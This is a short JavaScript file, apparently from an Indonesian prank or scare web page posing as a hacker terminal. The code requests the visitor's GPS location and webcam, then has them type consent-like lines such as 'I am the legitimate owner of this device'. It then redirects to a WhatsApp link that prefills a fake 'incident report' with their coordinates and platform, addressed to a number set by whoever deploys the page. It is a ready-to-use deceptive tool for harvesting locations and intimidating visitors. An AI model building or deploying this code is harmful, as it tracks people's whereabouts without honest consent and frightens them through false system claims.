const typer = document.getElementById('typer');
const bar = document.getElementById('bar');
const commandPrompt = document.getElementById('command-prompt');
const locTag = document.getElementById('loc-tag');
const video = document.getElementById('webcam');

let level = 0;
let userData = { coords: "0,0", city: "Unknown", os: navigator.platform };

const tasks = [
    "SAYA ADALAH PEMILIK SAH PERANGKAT INI.",
    "SINKRONISASI GPS DIIZINKAN.",
    "AKSES DATA BIOMETRIK SELESAI.",
    "KIRIM LAPORAN KE SERVER PUSAT."
];

// Inisialisasi Lokasi & Kamera
document.getElementById('init-btn').addEventListener('click', async () => {
    document.getElementById('setup-screen').style.display = 'none';
    document.getElementById('main-terminal').style.display = 'flex';
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            userData.coords = `${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)}`;
            locTag.textContent = `LOC: ${userData.coords}`;
        });
    }

    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
    } catch(e) {}
    updateTask();
});

function updateTask() {
    if (level < tasks.length) {
        commandPrompt.textContent = tasks[level];
        typer.value = "";
        bar.style.width = `${(level / tasks.length) * 100}%`;
    } else {
        forceWhatsAppRedirect();
    }
}

typer.addEventListener('input', () => {
    if (typer.value.toUpperCase() === tasks[level].toUpperCase()) {
        level++;
        updateTask();
    }
});

function forceWhatsAppRedirect() {
    typer.style.display = "none";
    commandPrompt.textContent = "MENGIRIM LAPORAN... [100%]";
    
    // GANTI NOMOR WA KAMU DISINI (Awali dengan 62)
    const nomorWA = "628xxxxxxxxxx"; 
    const teksPesan = `🚨 LAPORAN INSIDEN 2026 🚨%0A------------------------%0A📍 Koordinat: ${userData.coords}%0A💻 Perangkat: ${userData.os}%0A📸 Status: Terekam.%0A------------------------%0ALaporan dikirim otomatis oleh System Diagnostic.`;

    setTimeout(() => {
        // Efek transisi ke WA
        window.location.href = `https://wa.me/${nomorWA}?text=${teksPesan}`;
    }, 1500);
}
